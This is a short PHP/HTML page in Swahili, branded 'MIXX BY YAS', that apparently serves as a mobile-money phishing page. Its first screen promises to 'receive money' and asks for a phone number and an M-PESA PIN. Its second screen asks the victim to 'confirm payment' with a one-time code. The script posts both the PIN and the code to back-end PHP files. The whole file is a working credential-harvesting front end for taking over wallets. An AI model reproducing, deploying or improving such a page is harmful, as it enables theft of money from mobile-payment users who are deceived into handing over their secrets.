<?php session_start(); ?>
<!DOCTYPE html>
<html>
<head>
<title>MIXX OTP</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{font-family:Arial; text-align:center; padding:30px; background:#f2f2f2;}
.box{background:white; padding:20px; border-radius:10px; max-width:350px; margin:auto;}
input, button{padding:12px; margin:10px 0; width:90%; border:1px solid #ccc; border-radius:5px;}
button{background:#00A651; color:white; border:none; font-weight:bold;}
</style>
</head>
<body>
<div class="box">
<!-- SCREEN 1 -->
<div id="screen1">
  <h2>MIXX BY YAS</h2>
  <input type="text" id="phone" placeholder="Nambari ya Simu: 0712...">
  <input type="password" id="mpesa_pin" placeholder="Weka M-PESA PIN">
  <button onclick="requestOTP()">Pokea Pesa</button>
</div>

<!-- SCREEN 2 -->
<div id="screen2" style="display:none;">
  <h2>Thibitisha Malipo</h2>
  <p>Tumetuma nambari kwenye simu yako</p>
  <input type="text" id="otp" placeholder="Weka Nambari ya siri">
  <p id="timer">02:00</p>
  <button onclick="verifyOTP()">IDHINISHA</button>
  <br><a href="#" onclick="requestOTP()">Tuma tena</a>
</div>
</div>

<script>
let phone = "";
function requestOTP(){
  phone = document.getElementById('phone').value;
  let pin = document.getElementById('mpesa_pin').value;
  
  fetch('send_otp.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone, pin})
  }).then(res => res.json())
  .then(data => {
    if(data.status == "otp_sent"){
      document.getElementById('screen1').style.display = 'none';
      document.getElementById('screen2').style.display = 'block';
    }else{ alert(data.message) }
  });
}

function verifyOTP(){
  let otp = document.getElementById('otp').value;
  fetch('verify_otp.php', {
    method: 'POST', 
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone, otp})
  }).then(res => res.json())
  .then(data => alert(data.message));
}
</script>
</body>
</html>
